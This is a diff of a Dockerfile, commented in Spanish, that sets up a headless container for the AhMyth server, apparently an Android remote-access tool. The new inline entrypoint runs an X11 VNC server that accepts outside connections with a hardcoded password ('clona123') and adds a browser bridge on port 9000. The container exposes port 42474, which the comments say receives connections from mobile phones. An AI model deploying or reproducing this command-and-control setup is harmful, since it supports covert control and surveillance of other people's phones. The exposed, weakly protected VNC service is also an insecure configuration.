@@ -14,7 +14,7 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /app
 
 # Cache buster para forzar rebuild
-ARG CACHEBUST=12
+ARG CACHEBUST=13
 
 # Copiamos solo la parte del servidor
 COPY AhMyth-Server/app /app
@@ -32,12 +32,28 @@ RUN cd /app && npm install
 # Instalamos electron de forma global para la ejecución headless
 RUN npm install -g electron@9.2.0
 
-# Preparamos el script de inicio
-COPY entrypoint.sh /entrypoint.sh
-RUN chmod +x /entrypoint.sh
+# Creamos el entrypoint INLINE para evitar cache viejo
+RUN printf '#!/bin/bash\n\
+# 1. Iniciar pantalla virtual FULL HD\n\
+Xvfb :99 -screen 0 1920x1080x24 &\n\
+export DISPLAY=:99\n\
+\n\
+# 2. Iniciar administrador de ventanas\n\
+fluxbox &\n\
+\n\
+# 3. Iniciar servidor VNC - SIN -listen localhost para aceptar conexiones externas\n\
+x11vnc -display :99 -forever -passwd "clona123" &\n\
+\n\
+# 4. Iniciar bridge para ver en el navegador (Puerto 9000)\n\
+websockify --web /usr/share/novnc 9000 localhost:5900 &\n\
+\n\
+# 5. Iniciar el servidor de AhMyth\n\
+echo "Iniciando AhMyth Server..."\n\
+electron /app --no-sandbox\n' > /entrypoint.sh && chmod +x /entrypoint.sh
 
-# Puerto 9000: Para ver el panel en el navegador (noVNC)
-# Puerto 42474: Para recibir conexiones de los celulares
+# Puerto 9000: Panel web (noVNC)
+# Puerto 42474: Conexiones de celulares
+# Puerto 5900: VNC directo
 EXPOSE 9000 42474 5900
 
 CMD ["/entrypoint.sh"]
